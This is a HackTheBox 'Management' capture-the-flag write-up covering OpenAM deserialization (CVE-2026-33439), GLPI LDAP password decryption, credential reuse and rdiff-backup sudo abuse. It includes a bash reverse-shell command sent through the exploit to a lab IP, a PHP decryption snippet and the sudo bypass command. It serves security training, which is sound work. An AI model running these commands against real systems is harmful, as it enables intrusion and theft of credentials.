---
title: "Management"
date: 2026-09-15
categories: [HackTheBox, Easy]
tags: [linux, nginx, openam, forgerock, sso, ldap, jato, java-deserialization, cwe-502, cve-2026-33439, cve-2021-35464, pre-auth-rce, glpi, mariadb, reversible-encryption, libsodium, credential-reuse, rdiff-backup, sudo-wildcard]
image:
  path: /assets/img/HTB/Management/banner.png
  alt: Management writeup
protected: true
---

Management is an Easy Linux box built around an OpenAM single-sign-on deployment. A five-year-old bug class resurfaces as CVE-2026-33439 — unauthenticated Java deserialization in a JATO parameter OpenAM's maintainers forgot to patch alongside its sibling — for the foothold. From there, a locally-installed GLPI service-desk instance leaks a reversibly-encrypted LDAP bind password that turns out to be reused as a local user's own password, and a wildcard NOPASSWD sudo rule on `rdiff-backup` gets abused through its own remote-connection mechanism to read `root.txt` straight off disk.

| Field      | Details              |
|------------|------------------------|
| Platform   | HackTheBox              |
| Difficulty | Easy                     |
| OS         | Linux                    |
| IP         | 10.129.62.89             |
| Date       | September 2026           |

## Tools Used

| Tool                     | Description                                                                          |
|----------------------------|-----------------------------------------------------------------------------------------|
| nmap                        | Network port scanner and service fingerprinter                                         |
| CVE-2026-33439 PoC          | Public exploit script that sends the deserialization payload to OpenAM's password-reset endpoint |
| netcat                      | TCP listener used to catch the reverse shell                                           |
| MariaDB client (mysql)      | SQL client used to query the local GLPI database                                       |
| php (CLI)                   | Used inline to replicate GLPI's libsodium-based decryption of the stored LDAP bind password |
| rdiff-backup                | Backup tool abused both as the sudo-permitted binary and via its own remote-connection mechanism |

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services and identify the application stack worth attacking.

### Host Discovery

```bash
ping -c 1 10.129.62.89
PING 10.129.62.89 (10.129.62.89) 56(84) bytes of data.
64 bytes from 10.129.62.89: icmp_seq=1 ttl=63 time=43.4 ms

--- 10.129.62.89 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.404/43.404/43.404/0.000 ms
```

A TTL of 63 indicates a Linux host (default 64, decremented once across the routing hop).

### Port Scan

```bash
sudo nmap -p- -sCV -sS -n -Pn 10.129.62.89 -oN nmap
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http        nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.62.89/
443/tcp   open  ssl/http    nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://management.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
1689/tcp  open  java-rmi    Java RMI
| rmi-dumpregistry: 
|   org.opends.server.protocols.jmx.client-unknown
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:37331
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
4444/tcp  open  ssl/krb524?
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
36909/tcp open  java-rmi Java RMI
50389/tcp open  ldap     (Anonymous bind OK)
```

Six open ports, and between them they already sketch the whole stack. Port 80 redirects straight to HTTPS. Port 443's certificate names `management.htb` with a wildcard SAN (`*.management.htb`) — a wildcard doesn't just permit any subdomain at runtime, it tells an attacker the operator expected more than one vhost to exist, before a single one has been found by name. `management.htb` went into `/etc/hosts`.

Port 1689's `rmi-dumpregistry` output names `org.opends.server.protocols.jmx.client-unknown` — OpenDS/OpenDJ is the LDAP directory engine underneath the OpenAM identity stack, exposed here for JMX-based remote administration; `36909` is the dynamic stub port RMI handed out for talking to that registered object. `50389` is the directory's own LDAP port, and nmap's `(Anonymous bind OK)` is worth flagging even though it wasn't pursued further here. Port 4444's self-signed certificate is the most useful line in the whole scan: its `commonName` is `sso.management.htb` — a second hostname, disclosed in the TLS handshake itself, that hadn't been seen anywhere else yet. Its fingerprint strings (`objectClass`, `ds-root-dse`) confirm it's another LDAP-adjacent administration interface, this time over TLS.

### Web Enumeration — management.htb & sso.management.htb

`http://management.htb` loads a marketing site for "Management Managed Services Ltd", a fictional managed-IT-services provider, with a **Client login** button in the header. Hovering it — rather than clicking — surfaces its actual destination in the browser status bar without loading the page:

![Hovering the Client login button on management.htb, showing the linked destination in the browser status bar](/assets/img/HTB/Management/cap1.png)

`https://sso.management.htb` — the exact hostname nmap had already leaked in port 4444's certificate. It went into `/etc/hosts` too.

Loading `https://sso.management.htb/openam/XUI/#login/` lands on an OpenAM login screen. Its page source carries a RequireJS bootstrap block with a cache-busting `urlArgs` parameter:

```
<script type="text/javascript">
var require = {
urlArgs : "v=16.0.5",
deps : ['main']
};
</script>
```

`v=16.0.5` is there to bust browser caches on each release, not to announce the exact build — but it does both. OpenAM's own 16.0.6 release notes name the fix for a critical, unauthenticated bug in the version right below it: **CVE-2026-33439**, with a public PoC at [`github.com/infernosalex/CVE-2026-33439-Python-PoC`](https://github.com/infernosalex/CVE-2026-33439-Python-PoC).

## Exploitation

### CVE-2026-33439 — OpenAM `jato.clientSession` Deserialization (Pre-Auth RCE)

OpenAM's administration and self-service pages are built on JATO, a Sun-era Java web framework that keeps per-request UI state as serialized Java objects, carried across requests in two HTTP parameters: `jato.pageSession` and `jato.clientSession`. In 2021, CVE-2021-35464 showed that `jato.pageSession` was deserialized with no class filtering at all — a crafted gadget chain in that parameter meant pre-auth RCE, serious enough to land on CISA's Known Exploited Vulnerabilities list. The fix wrapped that one code path in a `WhitelistObjectInputStream`, which only allows roughly forty known-safe classes to be instantiated before it will deserialize anything.

Nobody touched the sibling parameter. `jato.clientSession` is deserialized by an entirely separate code path — `ClientSession.deserializeAttributes()` calling `Encoder.deserialize()`, which hands the bytes straight to a plain `ObjectInputStream.readObject()` with no whitelist at all. Five years after the first fix, the identical bug class was still sitting right next to it, just under a different parameter name. Any unauthenticated request to a JATO page whose JSP renders a `<jato:form>` tag — the password-reset flow is the textbook target — deserializes whatever arrives in `jato.clientSession`, no login required.

A plain `ls` confirmed command execution before committing to a shell:

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'ls'
[+] HTTP 200 
bin
bin.usr-is-merged
boot
[...]
```

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation "bash -c 'bash -i >& /dev/tcp/10.10.14.174/4444 0>&1'"
[-] The read operation timed out
```

The PoC's own HTTP client times out here — a reverse-shell payload blocks instead of returning a clean response — but the command still fires server-side before that happens:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.62.89 37764
bash: cannot set terminal process group (1698): Inappropriate ioctl for device
bash: no job control in this shell
openam@management:/$ whoami
whoami
openam
```

The listener caught the callback as `openam` — the service account OpenAM itself runs under, named for exactly what it is. A standard TTY upgrade made the shell usable.

## Lateral Movement — `openam` → `owen`

### Internal Reconnaissance

```bash
netstat -nltp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::50389                :::*                    LISTEN      1698/java           
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1698/java           
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      1698/java           
tcp6       0      0 :::1689                 :::*                    LISTEN      1698/java           
tcp6       0      0 :::37331                :::*                    LISTEN      1698/java           
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

Everything on PID `1698` (`java`) matches what nmap already found — OpenAM runs under an embedded Tomcat, confirmed here by its internal HTTP connector on `8080` and shutdown port on `8005`, both loopback-only, alongside the LDAP (`50389`) and RMI (`1689`/`37331`) ports. The new line is `127.0.0.1:3306` — a local MariaDB instance, invisible from the network scan entirely.

### GLPI — Finding the LDAP Bind Credential

```bash
find / -name "*conf*" 2>/dev/null | grep "/opt"
[...]
/opt/glpi/config/config_db.php
[...]
```

**GLPI** (Gestionnaire Libre de Parc Informatique) is an open-source IT asset and service-desk platform — a natural fit for a company called Management. Its database config file was sitting in plain sight:

```bash
cat /opt/glpi/config/config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

Straight into the local MariaDB instance with those credentials. `glpi_users` was worth a look first, but its password hashes didn't crack against anything and none of its accounts led anywhere — a quick dead end. `glpi_authldaps` was more interesting: GLPI can synchronise its accounts against an external directory, and the table holds exactly the bind configuration used to do it.

```bash
MariaDB [glpidb]> select * from glpi_authldaps\G;
*************************** 1. row ***************************
                       id: 1
                     name: Management Directory
                     host: sso.management.htb
                   basedn: dc=management,dc=htb
                   rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
[...]
                  comment: Primary directory bind used to synchronise managed client accounts.
[...]
            rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
[...]
```

`rootdn` is a service account, `svc-glpi`, that GLPI uses to bind to the directory and pull in managed users — exactly the kind of privileged, often-reused account worth chasing. `rootdn_passwd` isn't a hash: a bind credential has to be sent to the directory in a form the directory can verify, so GLPI can't get away with one-way hashing here the way it can for ordinary user logins. It has to be reversible — encrypted with a key GLPI itself holds, not hashed.

### Decrypting the Bind Password

```bash
cat /opt/glpi/src/GLPIKey.php
[...]
$nonce = mb_substr($string, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, '8bit');
[...]
```

GLPI encrypts LDAP bind passwords with libsodium's XChaCha20-Poly1305 authenticated encryption, using a key stored on disk at `/opt/glpi/config/glpicrypt.key`. The stored value is just base64: decode it, and the first `SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES` bytes are the nonce, with the ciphertext right after. Anyone who can read both the encrypted value in the database and the key file on disk — which `openam` already could, GLPI's own file permissions notwithstanding — can decrypt it with nothing more than PHP and the same `sodium_crypto_aead_xchacha20poly1305_ietf_decrypt()` call GLPI uses internally:

```bash
php -r '
$keyfile = "/opt/glpi/config/glpicrypt.key";
$key = file_get_contents($keyfile);

$encoded = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==";
$raw = base64_decode($encoded);

$nonce_len = SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES;
$nonce = mb_substr($raw, 0, $nonce_len, "8bit");
$ciphertext = mb_substr($raw, $nonce_len, null, "8bit");

$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ciphertext, $nonce, $nonce, $key);

echo $plaintext . PHP_EOL;
'
WpczC40GhTbk
```

That plaintext is `svc-glpi`'s LDAP bind password — and it turned out to also be the local Linux password for `owen`, a straightforward case of the same credential reused across the directory layer and the OS layer:

```bash
su owen
Password: 
```

That's full interactive access as a genuine local user — a stronger foothold than the `openam` service account for the privilege-escalation search that followed.

## Privilege Escalation — `owen` → `root`

### Enumeration

```bash
sudo -l
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

A specific invocation, not a blanket grant — but the trailing `*` matters. Sudoers wildcards match anything after the fixed prefix, so `owen` can run this exact command with any additional arguments appended after `read-only`. A quick sanity check confirms the rule accepts extras:

```bash
sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --version *
rdiff-backup 2.2.6
```

### Abusing `--remote-schema`

`rdiff-backup` backs up either a local path or a remote one — a remote location is written as `host::path`, and for those, `rdiff-backup` doesn't talk to the remote filesystem directly: it spawns a subprocess (normally `ssh`) to run a second copy of itself in `--server` mode on the other end, and pipes commands to it over that subprocess's stdin/stdout. `--remote-schema` overrides exactly what that subprocess command is, and `rdiff-backup` only insists on one thing: the template has to contain a `%s`, the placeholder where it substitutes the hostname.

That's enough to turn the sudo rule against itself. Point `--remote-schema` at the very same sudo invocation `owen` is already allowed to run, and `rdiff-backup` will use it as the connection command — but with fresh `--restrict-path` and `--restrict-mode` flags appended, which override the ones baked into the sudoers rule (a repeated flag takes the last value it's given), lifting the restriction from `/opt/backup` to `/`. The `%s` still has to appear somewhere to satisfy `rdiff-backup`'s own check, so it goes at the very end, after a shell comment character (`#`) that keeps it from ever reaching the actual command as a real argument.

```bash
rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-only #%s' \
  --include /root/root.txt --exclude '**' \
  x::/ /tmp/leak
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.
NOTE: Starting mirror from source path / to destination path /tmp/leak
```

`x::/` is a throwaway remote-looking source — the hostname `x` is never actually used, since `--remote-schema` replaces the entire connection step. `--include /root/root.txt --exclude '**'` narrows the mirror to exactly one file. The `--server` process on the other end of that pipe runs as root, unrestricted; the client side, still running as `owen`, just receives what it sends back:

```bash
ls
leak
root.txt

cd leak/root
ls -la
-rw-r----- 1 owen owen   33 Sep 17 08:16 root.txt
cat root.txt
```

No interactive root shell was ever opened — this is root-owned arbitrary file read, achieved by hijacking `rdiff-backup`'s own idea of how to reach a "remote" peer. That's all `root.txt` needs.

## Flags

| Flag     | Value      |
|----------|------------|
| root.txt | `REDACTED` |

## Key Takeaways

- **A patch that covers one of two near-identical code paths is only half a fix.** CVE-2026-33439 existed because `jato.pageSession` and `jato.clientSession` deserialize the same kind of data through two separate implementations, and only one of them got the 2021 whitelist. When a fix targets a specific parameter, function, or endpoint, it's worth asking whether a sibling with the same shape got left behind.
- **TLS certificates disclose hostnames whether or not you go looking.** The `commonName` on an internal admin interface's certificate named a subdomain — `sso.management.htb` — before it had been found any other way; a wildcard SAN on a public-facing cert does the same trick for whole families of subdomains at once.
- **A bind password has to be reversible, so treat it like a live credential, not a hash.** Any application that authenticates outbound to a directory or a database needs the plaintext at some point, which means the decryption key sits on the same disk as the ciphertext. Reading both is enough.
- **Service accounts get reused as human passwords more often than policy allows for.** `svc-glpi`'s LDAP bind password unlocking `owen`'s own local login is the same failure mode as any other case of password reuse — just one layer further from where most people think to check.
- **A sudoers wildcard (`*`) is a promise the target program has to keep, not sudo.** `sudo` enforces the fixed prefix; everything after the `*` is the program's own problem, and if that program has a feature — a custom connection command, a plugin path, a config override — that itself runs commands or resolves paths, the wildcard just handed it over.
- **Getting `root.txt` doesn't require becoming root.** An arbitrary-file-read primitive backed by root's permissions is worth exactly as much as a root shell for anything that only needs to read one file — no reason to chase an interactive shell if the read alone finishes the job.
